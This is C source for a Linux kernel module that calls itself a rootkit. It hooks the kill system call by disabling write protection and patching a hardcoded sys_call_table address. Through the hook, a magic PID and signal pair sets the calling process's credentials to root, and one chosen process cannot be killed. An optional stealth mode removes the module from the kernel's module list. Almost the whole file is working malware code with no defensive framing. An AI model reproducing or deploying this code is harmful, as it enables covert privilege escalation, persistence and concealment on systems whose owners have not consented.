#include <asm/unistd.h>
#include <linux/highmem.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/moduleparam.h>

MODULE_LICENSE("GPL");

#define ROOT_PID 7311
#define ROOT_SIG 7

static int lpid = 28427;//需要防止被终止的进程id
module_param(lpid, int, 0);

//#define STEALTH_MODE 1 

unsigned long *sys_call_table = (unsigned long*) 0xffffffff816005e0;

static unsigned int ocr0;

unsigned int clear_cr0(){
    unsigned int cr0 = read_cr0();
    write_cr0(cr0 & 0xfffeffff);
    return cr0;
}

typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
kill_ptr orig_kill;

asmlinkage int hacked_kill(pid_t pid, int sig){
    int actual_result;

    //root-access
    if (pid == ROOT_PID && sig == ROOT_SIG){
        struct cred *cred;
        cred = (struct cred *)__task_cred(current);
        cred->uid = 0;
        cred->gid = 0;
        cred->suid = 0;
        cred->euid = 0;
        cred->euid = 0;
        cred->egid = 0;
        cred->fsuid = 0;
        cred->fsgid = 0;
        return 0;        
    }else if(pid == lpid){
        printk(KERN_INFO "You cannot kill me! by process %d", lpid);
        return 0;
    }    
    
    actual_result = (*orig_kill)(pid, sig);
    return actual_result;
}


static int rootkit_in(void){           
#ifdef STEALTH_MODE
    struct module *self;
#endif
    ocr0 = clear_cr0();
    orig_kill = (kill_ptr)sys_call_table[__NR_kill]; //hooking
    sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
    write_cr0(ocr0);
#ifdef STEALTH_MODE
    mutex_lock(&module_mutex);
    if((self = find_module("test")))
        list_del(&self->list);
    mutex_unlock(&module_mutex);
#endif    
    printk(KERN_INFO "Loading rookit\n");
    return 0;
}

static int rootkit_out(void){
    ocr0 = clear_cr0();
    sys_call_table[__NR_kill] = (unsigned long) orig_kill;
    write_cr0(ocr0);    
    printk(KERN_INFO "Romove rookit\n");
    return 0;
}

module_init(rootkit_in);
module_exit(rootkit_out);
